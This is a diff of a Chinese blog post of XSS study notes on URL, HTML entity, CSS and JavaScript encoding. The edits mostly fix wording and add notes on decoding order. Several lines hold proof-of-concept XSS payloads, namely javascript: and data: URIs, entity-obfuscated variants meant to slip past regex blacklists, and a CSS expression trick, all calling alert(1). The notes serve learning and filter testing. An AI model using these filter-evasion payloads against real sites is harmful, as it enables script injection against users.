@@ -22,7 +22,7 @@
 
 
     <meta name="author" content="莲的思念">
-    <meta name="description" content="基本概念 URL格式： scheme://[login[:password]@](host_name|host_address)[:port][/hierarchical/path/to/resource[?search_string][#fragment_id]] 在RFC 3986文档中定义了一个URI的基本结构，定义了没有特殊意义的字符： 0-9 a-z A-Z - . _ ~ 以及一些在某些地方可能有特殊意义的字符： : / ? # [ ] @ ! $ ' ( ) * + , ; = 还有一些字符，当它们直接放在URL中时可能会引起解析程序的歧义，这些字符被视为不安全字符： 空格 引号和<> % { } | \ ^ [ ] ` ~ 其他字符可以用%加十六进制编码来表示，包括%自身，对于Unicode字符，建议使用utf-8对其进行编码得到相应的字节，然后对每个字节进行%编码。 HTML 原文地址 重要的四个原则 &符号不应该出现在HTML的大部分节点中 <>不应出现在标签内，除非被引号所用 在text节点中，<有很大危害，会截断后面的内容 引号在标签内可能有害，具体取决于存在的位置，但是在text中无害。 了解HTML解析 在IE浏览器中允许在1处插入NULL字符，可以绕过很多xss过滤器 ...">
+    <meta name="description" content="基本概念 URL格式： scheme://[login[:password]@](host_name|host_address)[:port][/hierarchical/path/to/resource[?search_string][#fragment_id]] 在RFC 3986文档中定义了一个URI的基本结构，定义了没有特殊意义的字符： 0-9 a-z A-Z - . _ ~ 以及一些在某些地方可能有特殊意义的字符： : / ? # [ ] @ ! $ ' ( ) * + , ; = 还有一些字符，当它们直接放在URL中时可能会引起解析程序的歧义，这些字符被视为不安全字符： 空格 引号和<> % { } | \ ^ [ ] ` ~ 其他字符可以用%加十六进制编码来表示，包括%自身，对于Unicode字符，建议使用utf-8对其进行编码得到相应的字节，然后对每个字节进行%编码。 javascript: 和 data: 伪协议后的内容中可以使用URL编码。 HTML 原文地址 重要的四个原则 &符号不应该出现在HTML的大部分节点中 <>不应出现在标签内，除非被引号所用 在text节点中，<有很大危害，会截断后面的内容 引号在标签内可能有害，具体取决于存在的位置 ...">
   <meta name="tags" contents="">
 </head>
 
@@ -81,6 +81,7 @@
 
 
 <p>其他字符可以用%加十六进制编码来表示，包括%自身，对于Unicode字符，建议使用utf-8对其进行编码得到相应的字节，然后对每个字节进行%编码。</p>
+<p>javascript: 和 data: 伪协议后的内容中可以使用URL编码。</p>
 <h1>  HTML </h1>
 
 <p><a href="http://drops.wooyun.org/tips/147">原文地址</a></p>
@@ -101,9 +102,9 @@
 </pre></div>
 
 
-<h2> Entity编码 </h2>
+<h2> 实体编码 </h2>
 
-<p>HTML解析器在建立文档的时候会针对节点内的Entity编码解码后传输，对于标签本身结构的编码，如对属性名称进行编码则不会执行解码。</p>
+<p>HTML解析器在建立DOM文档的时候会针对实体编码进行自解码（包括标签间的文本和标签内的属性值），对于标签本身结构的编码，如对属性名称进行编码则不会执行解码。</p>
 <h2> Fuzzing </h2>
 
 <p>对一个普通的HTML进行Fuzzing测试。</p>
@@ -173,10 +174,9 @@
 </tbody>
 </table>
 
-<p>IE浏览器会自动忽略空字符，并解析剩下的代码，这样会绕过很多采用正则匹配的黑名单。</p>
+<p>IE浏览器会自动忽略空字符(null)，并解析剩下的代码，这样会绕过很多采用正则匹配的黑名单。</p>
 <p>测试发现，标签名和属性名之间只要是以/开头以/结尾，中间可以插入任意字符。</p>
 <p>在Fuzzing属性方面考虑两方面，一个是可以使用什么分隔符，一个是属性值可以采用什么编码</p>
-<p>属性为字符串的时候可以作为分隔符的字符，可以用\x十六进制表示那些不可打印的字符。</p>
 <p>各标签中各属性支持Javascript的总结：</p>
 <div class="highlight"><pre><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>  //Firefox, Chrome, IE8
 <span class="nt">&lt;embed</span> <span class="na">src=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>   //Firefox
@@ -210,7 +210,7 @@
 </pre></div>
 
 
-<p>同时&amp;#后面可以跟任意多个0：</p>
+<p>同时&amp;#后面允许跟任意多个0：</p>
 <div class="highlight"><pre><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;j&amp;#x61;vascript: //%0&amp;#x61;&amp;#x00025;61lert(1)&quot;</span><span class="nt">&gt;</span>12<span class="nt">&lt;/a&gt;</span>
 </pre></div>
 
@@ -229,11 +229,11 @@
 <div class="highlight"><pre><span class="o">&lt;</span><span class="nt">iframe</span> <span class="nt">src</span><span class="o">=</span><span class="s2">&quot;d&amp;#097;t&amp;#x00061:.&amp;#x2c &amp;#x25;3c</span>
 <span class="s2"> s cri &amp;#x000D; pt %</span>
 <span class="s2"> 3 e al\u0065rt(1)</span>
-<span class="s2"> %3c /s &amp;#x43 RI &amp;#x009 P t&gt;&quot;</span><span class="o">&gt;</span>
+<span class="s2"> %3c /s &amp;#x43 RI P t&gt;&quot;</span><span class="o">&gt;</span>
 </pre></div>
 
 
-<p>在IE中data:协议不能执行javascript，但是在style标签中，可以通过@import命令插入data:执行javasrcript</p>
+<p>IE不支持data:伪协议，但是在style标签中，可以通过@import命令插入data:执行javasrcript</p>
 <div class="highlight"><pre><span class="o">&lt;</span><span class="n">style</span><span class="o">&gt;</span>
 <span class="cp">@import</span> <span class="s2">&quot;data:, *%7bx:expression(write(1))%7d&quot;</span><span class="p">;</span>
 <span class="o">&lt;</span><span class="err">/style&gt;</span>
@@ -241,7 +241,7 @@
 
 
 <p>利用 xxx.src="javascript:HTML代码" 方法可以去掉refer：</p>
-<div class="highlight"><pre><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">&#39;a&#39;</span> <span class="na">src=</span><span class="s">&#39;&#39;</span><span class="nt">&gt;&lt;/ifram&gt;</span>
+<div class="highlight"><pre><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">&#39;a&#39;</span> <span class="na">src=</span><span class="s">&#39;&#39;</span><span class="nt">&gt;&lt;/iframe&gt;</span>
 <span class="nt">&lt;script&gt;</span>
  document.getElementById(&quot;a&quot;).src=&#39;javascript:&quot;<span class="nt">&lt;html&gt;&lt;body&gt;</span>wooyun.org<span class="nt">&lt;scr</span><span class="err">&#39;+&#39;ipt</span><span class="nt">&gt;</span>alert(1)<span class="err">&lt;</span>/scri&#39;+&#39;pt&gt;<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>&quot;&#39;; 
 <span class="nt">&lt;/script&gt;</span>
@@ -264,6 +264,8 @@
 
 
 <p>事件同时又能调用其他属性。</p>
+<p>HTML实体编码适用于标签内的属性值和标签间的文本（<script>标签间的文本除外）。</p>
+<p>HTML自解码只进行一次。</p>
 <h1>  CSS </h1>
 
 <p>调用方式有三种：1、用<code>&lt;style&gt;</code>；2、通过<code>&lt;link rel=stylesheet&gt;</code>或者使用style参数；3、XML可以通过&lt;?xml-stylesheet href=...?&gt;</p>
@@ -285,10 +287,11 @@
 
 <ol>
 <li>C语言编码，\b表示退格，\t表示制表符等</li>
-<li>三位数字：用反斜杠加三位8进制数字。</li>
 <li>两位数字：反斜杠加x加两位十六进制数字和字母。</li>
 <li>四位数字：反斜杠加u加四位十六进制数字和字母。不止是字符串中，代码中也可，例如用\u0061lert表示alert</li>
 </ol>
+<p>JS编码适用于<script>标签间的文本，javascript:和data:伪协议后的内容，on*事件属性的属性值。</p>
+<p>先进行HTML解码再运行JS脚本。</p>
 <h2>  Fuzzing </h2>
 
 <p>JS中，window对象是全局变量，并且默认定义的变量都是全局变量。数组默认返回最后一个。</p>
